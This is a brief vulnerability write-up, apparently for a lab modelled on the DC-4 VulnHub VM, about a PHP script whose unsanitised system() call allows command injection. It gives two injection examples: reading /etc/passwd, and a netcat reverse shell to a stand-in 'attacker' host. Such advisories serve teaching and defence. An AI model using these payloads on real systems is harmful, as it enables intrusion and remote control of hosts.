# PHP Command Injection - No Input Sanitization

## Severity
**Critical** (CVSS 10.0)

## CVE
N/A (application vulnerability)

## Description
A PHP script passes user input directly to system() without any sanitization using
escapeshellarg() or escapeshellcmd(). An attacker can inject arbitrary OS commands
(e.g., `; cat /etc/passwd` or `| nc attacker 4444 -e /bin/bash`).

Mirrors the DC-4 VulnHub VM with web-based command execution.

## Affected Service
- **Service:** Apache + PHP
- **Port:** 80/TCP
- **Configuration:** /var/www/html/cmd.php
